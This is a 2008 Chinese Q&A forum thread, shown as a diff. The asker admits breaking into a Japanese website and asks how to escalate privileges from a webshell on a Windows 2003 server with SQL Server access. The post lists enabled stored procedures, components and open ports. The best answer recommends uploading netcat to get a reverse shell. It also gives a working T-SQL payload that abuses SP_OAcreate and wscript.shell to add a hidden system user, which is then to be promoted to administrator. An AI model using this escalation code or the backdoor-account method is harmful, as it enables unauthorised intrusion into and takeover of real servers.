@@ -1,0 +1,59 @@
+db_owner权限WEBSHELL提权问题（曰本网站。英文2003操作系统） 浏览次数：938次悬赏分：50 | 解决时间：2008-11-16 11:36 | 提问者：土匪VS刀哥 
+今天入侵了一个曰本的网站。想在WEBSHELL里面提权。但是尝试了好多办法都不行。麻烦各位高手提供下方法。
+肯定是可以提权的。因为在这个网站上已经看到两名黑客前辈留下的后门以及在管理员账号中可以看到前辈的账号。他们是如何提权的我不太清楚。
+CMD可以用。必须是后上传到ALLUSER里面才可以用。但是权限不高。只能查询。提权命令以及运行命令不可用。SQL提权权限也不够。但是账号密码都知道。
+WINDOWS 2003系统
+郁闷，权限不够估计不能执行命令！
+XP_CMDSHELL............. 存在!
+SP_OACREATE............. 存在!
+XP_REGWRITE............. 存在!
+XP_SERVICECONTROL 存在!
+
+只有SQL。其他SU、pcAnywhere、VNC都没有安装。
+
+以下是服务器资料
+
+Scripting.FileSystemObject √ 文件操作组件 
+wscript.shell √ 命令行执行组件 
+ADOX.Catalog √ ACCESS建库组件 
+JRO.JetEngine √ ACCESS压缩组件 
+Scripting.Dictionary √ 数据流上传辅助组件 
+Adodb.connection √ 数据库连接组件 
+Adodb.Stream √ 数据流上传组件 
+SoftArtisans.FileUp × SA-FileUp 文件上传组件 
+LyfUpload.UploadFile × 刘云峰文件上传组件 
+Persits.Upload.1 × ASPUpload 文件上传组件 
+JMail.SmtpMail × JMail 邮件收发组件 
+CDONTS.NewMail × 虚拟SMTP发信组件 
+SmtpMail.SmtpMail.1 × SmtpMail发信组件 
+Microsoft.XMLHTTP √ 数据传输组件 
+
+
+开放端口。
+
+127.0.0.1:21.........开放
+127.0.0.1:23.........关闭
+127.0.0.1:25.........开放
+127.0.0.1:80.........开放
+127.0.0.1:110.........开放
+127.0.0.1:135.........开放
+127.0.0.1:139.........关闭
+127.0.0.1:445.........开放
+127.0.0.1:1433.........开放
+127.0.0.1:3389.........开放
+127.0.0.1:43958.........关闭
+
+经过检查。不存在SHIFT后门。
+
+SQL密码已经知道但是SQL进去以后权限不够。不能运行命令。ASPX脚本支持。但是跟ASP一样的权限。不能运行系统命令。PHP脚本不支持
+
+各位高手请帮忙啊。。
+       最佳答案 通过你说的我想到了以下几个方法。 
+1、上传个NC上去反弹回来一个shell，权限和在webshell里的权限是不一样的。 
+2、SQL里面用沙盘模式试试。
+P_OAcreate可以用 用SP_OAcreate一样可以执行系统命令
+在查询分析器里执行
+DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD 
+@shell,'run',null, 'C:\WINdows\system32\cmd.exe /c net user gydyhook hook /add'
+这段代码就是利用SP_OAcreate来添加一个gydyhook的系统用户 然后直接提升为管理员权限就OK了.
+祝你好运！！！！
